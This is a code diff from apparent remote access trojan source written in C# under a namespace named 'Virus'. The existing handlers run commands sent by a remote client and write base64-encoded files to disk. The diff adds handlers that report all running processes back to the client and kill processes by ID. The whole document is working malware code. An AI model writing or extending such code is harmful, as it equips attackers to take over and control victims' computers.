@@ -51,7 +51,7 @@ namespace Virus {
         
         private void run(string s) {
             string output = new Command(s).Run();
-            ResponseBuilder.msg(output.Replace(Environment.NewLine, Client.LINE_SEPERATOR));
+            ResponseBuilder.msg(output);
         }
 
         private void copyfile(string s) {
@@ -59,6 +59,26 @@ namespace Virus {
             string data = s.Split(new char[] { ',' }, 2)[1];
             byte[] bytes = Tools.DecodeFromBase64(data);
             File.WriteAllBytes(name, bytes);
+        }
+
+        private void listtasks(string s) {
+            if(Boolean.Parse(s)) {
+                String answer = "";
+                foreach (Process process in Process.GetProcesses()) {
+                    answer += "Process: " + process.ProcessName + "; ID: " + process.Id + "; Window Title: " + process.MainWindowTitle + Environment.NewLine;
+                }
+                ResponseBuilder.msg(answer);
+            }
+        }
+
+        private void killtask(string s) {
+            int id = Convert.ToInt32(s);
+            foreach (Process process in Process.GetProcesses()) {
+                if (process.Id == id) {
+                    process.Kill();
+                    break;
+                }
+            }
         }
 
         private void stop(string s) {
